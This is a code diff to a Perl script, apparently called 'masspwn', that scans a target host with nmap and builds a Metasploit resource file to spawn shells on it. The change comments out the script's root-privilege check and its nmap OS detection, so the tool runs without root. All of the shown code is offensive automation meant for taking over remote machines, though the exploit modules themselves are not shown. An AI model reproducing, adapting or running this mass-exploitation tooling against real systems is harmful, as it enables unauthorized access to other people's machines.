@@ -15,16 +15,16 @@ if($#ARGV < 1) {
   print("  type sessions 1\n");
   exit(1);
 }
-if(`id` !~ m/root/) {
-  print("err: Must be run as root on the local machine.\n");
-  exit(1);
-}
+#if(`id` !~ m/root/) {
+#  print("err: Must be run as root on the local machine.\n");
+#  exit(1);
+#}
 my $lhost = $ARGV[1];
 my $rhost = $ARGV[0];
 print("trying to spawn a shell from $rhost...\n");
 unlink("masspwn.nmap");
 unlink("masspwn.msf");
-system("nmap $rhost -O -oG masspwn.nmap >/dev/null");
+system("nmap $rhost -oG masspwn.nmap >/dev/null");
 my $nms = `cat masspwn.nmap`;
 my @nmap;
 @nmap = split("\n", $nms);
@@ -57,9 +57,9 @@ foreach my $value (@modules) {
     $seen{$value} = 1;
   }
 }
-@nmap[2] =~ m/.*OS: (\w+) /;
-my $os = $1;
-my $los = lc($os);
+#@nmap[2] =~ m/.*OS: (\w+) /;
+#my $os = $1;
+#my $los = lc($os);
 my $handler = 2000;;
 my $fh;
 open($fh, ">", "masspwn.msf");
